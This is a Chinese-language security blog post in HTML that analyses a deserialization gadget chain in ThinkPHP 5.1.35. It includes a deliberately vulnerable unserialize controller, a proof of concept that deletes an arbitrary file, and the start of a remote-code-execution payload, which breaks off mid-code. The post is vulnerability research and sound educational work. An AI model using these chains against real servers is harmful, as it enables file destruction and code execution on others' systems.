@@ -1,0 +1,1415 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="环境搭建 ThinkPHP5.1.35 PHP7.0.33">
+<meta name="keywords" content="web安全,代码审计,ThinkPHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP5.1.35 RCE反序列化链分析">
+<meta property="og:url" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/index.html">
+<meta property="og:site_name" content="Pines404">
+<meta property="og:description" content="环境搭建 ThinkPHP5.1.35 PHP7.0.33">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/1.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/2.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/3.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/4.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/7.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/5.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/6.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/9.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/8.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/10.jpg">
+<meta property="og:updated_time" content="2020-01-20T13:58:01.106Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ThinkPHP5.1.35 RCE反序列化链分析">
+<meta name="twitter:description" content="环境搭建 ThinkPHP5.1.35 PHP7.0.33">
+<meta name="twitter:image" content="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/1.jpg">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>ThinkPHP5.1.35 RCE反序列化链分析 | Pines404</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pines404</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">穷究于理，成就于工</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">18</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">5</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">32</span></a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Azeroth">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pines404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ThinkPHP5.1.35 RCE反序列化链分析
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-01-20 21:49:41 / 修改时间：21:58:01" itemprop="dateCreated datePublished" datetime="2020-01-20T21:49:41+08:00">2020-01-20</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+		  
+		  
+			<span class="post-updated">
+			&nbsp; | &nbsp; 更新于
+			<time itemprop="dateUpdated" datetime="2020-01-20T21:58:01+08:00" content="2020-01-20">
+			  2020-01-20
+			</time>
+		  </span>
+		  
+
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">7.2k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">7 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li>ThinkPHP5.1.35</li>
+<li>PHP7.0.33</li>
+</ul>
+<a id="more"></a>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $str = base64_decode($_POST[<span class="string">'payload'</span>]);</span><br><span class="line">        <span class="keyword">echo</span> $str;</span><br><span class="line">        unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">($name = <span class="string">'ThinkPHP5'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello,'</span> . $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h3><p>若ThinkPHP框架中出现了可控反序列化时，首先寻找常见的魔法函数（__desctruct、__wakeup等），再一步步往下挖掘。</p>
+<p>此处首先框架中搜索<code>__desctruct()</code>，发现Windows.php：</p>
+<img src="//songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/1.jpg" style="zoom:67%;">
+
+<p>往下查看removeFiles()：</p>
+<img src="//songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/2.jpg" style="zoom:67%;">
+
+<p>$this-&gt;files可控，显然可造成任意文件删除，构造poc：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $files=[];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="string">"D:/WampServer/www/tp5/tp5.1.35/public/hacker.txt"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a= <span class="keyword">new</span> Windows();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<p>但仔细观察发现，file_exists()方法对参数$filename（String）进行了检查，如果$filename为对象，则会触发魔法函数__toString()，全局搜索__toString()查看是否存在可利用的地方</p>
+<p>在<code>thinkphp/library/think/model/concern/Conversion.php</code>中发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>//类当字符串使用时触发</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/3.jpg" style="zoom:67%;">
+
+<p>在toArray()方法中，$this-&gt;append可控，$key（键）传入getRelation()处理，其中内部处理流程也可控。</p>
+<p>如果返回值$relation为空，再次将$key传入getAttr()处理，其中内部处理可控，返回值赋值给$relation；然后$relation调用visible方法，参数为$name（值）。</p>
+<p>这里是漏洞的关键点：$relation的具体值可控，同时它最终将调用visible()方法，我们知道：访问不可访问或不存在的方法时会触发__call()方法</p>
+<p>在往下寻找__cal()可用类之前，需要理解PHP <strong>Trait</strong>的基本用法</p>
+<blockquote>
+<p>PHP是单继承语言，无法像java同时从两个基类中继承属性和方法，从5.4开始，PHP提供Trait（复用）来实现多继承这一用法。</p>
+<p>用法：（1）Trait无法被实例化 （2）在类中使用use [Trait name]声明“继承”（3）可设置</p>
+<p>特性：（1）当一个类分别extends和use trait一个类时，三者同名方法优先级：本类&gt;Trait&gt;extends</p>
+<p>（2）使用Trait时可设置继承的方法和属性的权限</p>
+<p>（3）一个类中可使用多个Trait，重名会造成冲突，需替换或修改名称</p>
+</blockquote>
+<p>我们需要注意，getRelation()和getAttr()的方法分别在两个Trait中，而<code>Conversion.php</code>中并没有use这两个Trait，无法直接调用这两种方法，因此还需要找一个类同时继承以上两种Trait，以便能够调用这两种方法。</p>
+<p>$this-&gt;getRelation()和$this-&gt;getAttr()实现源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#thinkphp/library/think/model/concern/RelationShip.php</span></span><br><span class="line"><span class="keyword">trait</span> RelationShip&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#thinkphp/library/think/model/concern/Attribute.php</span></span><br><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $notFound = <span class="keyword">false</span>;</span><br><span class="line">            $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">            $notFound = <span class="keyword">true</span>;</span><br><span class="line">            $value    = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 检测属性获取器</span></span><br><span class="line">        $fieldName = Loader::parseName($name);</span><br><span class="line">        $method    = <span class="string">'get'</span> . Loader::parseName($name, <span class="number">1</span>) . <span class="string">'Attr'</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123;<span class="comment">//漏洞点2</span></span><br><span class="line">            <span class="keyword">if</span> ($notFound &amp;&amp; $relation = <span class="keyword">$this</span>-&gt;isRelationAttr($name)) &#123;</span><br><span class="line">                $modelRelation = <span class="keyword">$this</span>-&gt;$relation();</span><br><span class="line">                $value         = <span class="keyword">$this</span>-&gt;getRelationData($modelRelation);</span><br><span class="line">            &#125;</span><br><span class="line">            $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName];<span class="comment">//可控,assert()</span></span><br><span class="line">            $value   = $closure($value, <span class="keyword">$this</span>-&gt;data);<span class="comment">//参数可控</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (method_exists(<span class="keyword">$this</span>, $method)) &#123;</span><br><span class="line">           </span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;type[$name])) &#123;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($notFound) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;getRelationAttribute($name, $item);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#thinkphp/library/think/model/concern/Attribute.php</span></span><br><span class="line"><span class="keyword">trait</span> Attribute&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么现有两种任务需去做：</p>
+<ol>
+<li>寻找一个类同时继承两个Trait（RelationShip、Attribute），以便能够调用其中的方法</li>
+<li>寻找一个有__call()方法，其中最好存在代码执行相关方法。同时不存在visible方法的类</li>
+</ol>
+<p>针对第一个，发现Model类同时继承了RelationShip和Attrbute，这里需要提一句：在写payload时，这里Model是抽象类，不能实例化，需要找到它的子类，即<code>class Pivot extends Model{}</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于第二个，在Request类中发现疑似可控点:$this-&gt;hook可控，联系上面函数调用，$method值应为visible，$args值为调用visible()时的参数。</p>
+<p>这里疑似可命令执行，但是array_unshift()该方法会向数组插入一个值（$this），因为会对$args操作，所以这里无法构造出payload。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">            array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span> ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不过因为$this-&gt;hook可控，这里可以调用Request类中的某个方法，我们知道在input()方法中有安全机制会利用一些方法处理传入的数据，可能会导致RCE：</p>
+<img src="//songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/4.jpg" style="zoom:67%;">
+
+<p>一步一步回溯，input()中参数也不可控，继续往上</p>
+<img src="//songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/7.jpg" style="zoom:67%;">
+
+<p>到param()方法中，$name参数不可控：</p>
+<img src="//songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/5.jpg" style="zoom:67%;">
+
+<p>最终回溯到isAjax()，参数完全可控</p>
+<img src="//songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/6.jpg" style="zoom:67%;">
+
+<p>据此写出payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $files = [];</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];<span class="comment">#用于触发__toString()</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $config = [];</span><br><span class="line"> 